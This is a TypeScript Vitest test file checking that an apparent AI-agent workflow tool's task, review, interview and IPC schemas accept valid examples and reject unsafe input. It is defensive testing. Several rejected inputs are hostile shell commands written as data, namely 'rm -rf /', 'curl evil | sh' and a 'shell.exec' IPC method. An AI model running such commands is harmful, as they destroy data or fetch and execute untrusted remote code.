import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { parse as parseYaml } from 'yaml';
import {
  InterviewSchema,
  IpcMessageSchema,
  ReviewSchema,
  TaskSchema,
  resolveTask,
  reviewConsistencyErrors,
  validateAgainstJsonSchema,
  validateInterview,
  validateReview,
  validateTask,
  validateTaskProposal
} from '../src/index.js';

const examplesDir = join(import.meta.dirname, '..', '..', '..', 'examples');
const readExample = (name: string) => readFileSync(join(examplesDir, name), 'utf8');

describe('contracts: examples validate with Zod and JSON Schema', () => {
  it('examples/task.yaml is a valid Approved Task v2 [RA-09]', () => {
    const task = parseYaml(readExample('task.yaml'));
    const result = validateTask(task);
    expect(result.ok).toBe(true);
    expect(TaskSchema.parse(task).id).toBe('TASK-LOGIN-001');
    const resolved = resolveTask(TaskSchema.parse(task));
    expect(resolved.limits.maxImplementationAttempts).toBe(3);
    expect(resolved.review.blockingSeverities).toEqual(['critical', 'high']);
  });

  it('examples/interview.json validates', () => {
    const interview = JSON.parse(readExample('interview.json'));
    expect(validateInterview(interview).ok).toBe(true);
    expect(InterviewSchema.parse(interview).blockingQuestions).toEqual(['Q-001']);
  });

  it('examples/review.json validates', () => {
    const review = JSON.parse(readExample('review.json'));
    expect(validateReview(review).ok).toBe(true);
    expect(ReviewSchema.parse(review).verdict).toBe('changes_requested');
  });
});

describe('contracts: task schema rejects unsafe or incomplete input [RA-10][SEC-07]', () => {
  const base = parseYaml(readExample('task.yaml')) as Record<string, unknown>;

  it('rejects empty requirements', () => {
    const r = validateTask({ ...base, requirements: [] });
    expect(r.ok).toBe(false);
  });

  it('rejects empty acceptanceCriteria', () => {
    expect(validateTask({ ...base, acceptanceCriteria: [] }).ok).toBe(false);
  });

  it('rejects unknown verification profiles and arbitrary command injection fields', () => {
    expect(validateTask({ ...base, verificationProfile: 'shell' }).ok).toBe(false);
    expect(validateTask({ ...base, commands: ['rm -rf /'] }).ok).toBe(false);
    expect(validateTask({ ...base, verification: { run: 'curl evil | sh' } }).ok).toBe(false);
  });

  it('rejects maxImplementationAttempts above 3 (no unlimited fixes)', () => {
    expect(validateTask({ ...base, limits: { maxImplementationAttempts: 10 } }).ok).toBe(false);
  });

  it('rejects wrong schemaVersion', () => {
    expect(validateTask({ ...base, schemaVersion: 1 }).ok).toBe(false);
  });

  it('applies defaults for limits and review when omitted', () => {
    const { limits: _l, review: _r, ...noLimits } = base;
    const r = validateTask(noLimits);
    expect(r.ok).toBe(true);
    if (r.ok) {
      const resolved = resolveTask(r.value);
      expect(resolved.limits).toEqual({ maxImplementationAttempts: 3, maxDurationSeconds: 2700, cliTimeoutSeconds: 900, verificationTimeoutSeconds: 300 });
    }
  });
});

describe('contracts: review schema and consistency [EX-06][EX-07]', () => {
  it('rejects malformed review JSON (missing fields, bad severity)', () => {
    expect(validateReview({ verdict: 'approved' }).ok).toBe(false);
    expect(validateReview({ verdict: 'approved', findings: [], requirementsUnverified: [], summary: '' }).ok).toBe(false);
    expect(
      validateReview({
        verdict: 'approved',
        findings: [{ id: 'X', severity: 'blocker', file: 'a', line: 1, description: 'd', evidence: 'e', recommendation: 'r' }],
        requirementsUnverified: [],
        summary: 's'
      }).ok
    ).toBe(false);
  });

  it('flags approved verdict with blocking findings as inconsistent', () => {
    const review = ReviewSchema.parse({
      verdict: 'approved',
      findings: [{ id: 'R1', severity: 'high', file: 'a.ts', line: 3, description: 'd', evidence: 'e', recommendation: 'r' }],
      requirementsUnverified: [],
      summary: 'ok'
    });
    expect(reviewConsistencyErrors(review, ['critical', 'high'])).toHaveLength(1);
    expect(reviewConsistencyErrors(review, ['critical'])).toHaveLength(0);
  });

  it('flags approved verdict with unverified requirements', () => {
    const review = ReviewSchema.parse({ verdict: 'approved', findings: [], requirementsUnverified: ['x'], summary: 'ok' });
    expect(reviewConsistencyErrors(review, ['critical', 'high']).length).toBeGreaterThan(0);
  });
});

describe('contracts: interview schema caps', () => {
  it('rejects more than 3 questions per round [UI-05]', () => {
    const q = (i: number) => ({ id: `Q${i}`, question: 'q?', decisionImpact: 'blocking', options: [], recommendation: '' });
    const r = validateInterview({ facts: [], questions: [q(1), q(2), q(3), q(4)], blockingQuestions: [], summary: '' });
    expect(r.ok).toBe(false);
  });

  it('rejects extra properties such as commands (AI output must not carry executable instructions)', () => {
    const r = validateInterview({ facts: [], questions: [], blockingQuestions: [], summary: '', commands: ['rm -rf'] });
    expect(r.ok).toBe(false);
  });
});

describe('contracts: task proposal', () => {
  it('validates a well-formed proposal and rejects an empty one', () => {
    const ok = validateTaskProposal({
      title: 't',
      objective: 'o',
      requirements: ['r'],
      outOfScope: [],
      approach: 'a',
      acceptanceCriteria: [{ id: 'AC-1', given: 'g', when: 'w', then: 't' }],
      openItems: [],
      expectedChanges: ['src/x.ts'],
      conflictRisks: []
    });
    expect(ok.ok).toBe(true);
    expect(validateTaskProposal({ title: 't', objective: 'o', requirements: [], outOfScope: [], approach: 'a', acceptanceCriteria: [], openItems: [] }).ok).toBe(false);
  });
});

describe('contracts: ipc wire protocol', () => {
  it('accepts allowlisted methods and rejects others', () => {
    expect(validateAgainstJsonSchema('ipc', { id: '1', method: 'run.start', params: {} }).valid).toBe(true);
    expect(validateAgainstJsonSchema('ipc', { id: '1', method: 'shell.exec', params: {} }).valid).toBe(false);
    expect(IpcMessageSchema.safeParse({ id: '1', method: 'shell.exec', params: {} }).success).toBe(false);
  });

  it('accepts responses and events', () => {
    expect(validateAgainstJsonSchema('ipc', { id: '1', ok: true, result: { a: 1 } }).valid).toBe(true);
    expect(validateAgainstJsonSchema('ipc', { id: '1', ok: false, error: { code: 'X', message: 'm' } }).valid).toBe(true);
    expect(validateAgainstJsonSchema('ipc', { event: 'run.event', runId: 'r', payload: { sequence: 1 } }).valid).toBe(true);
  });
});
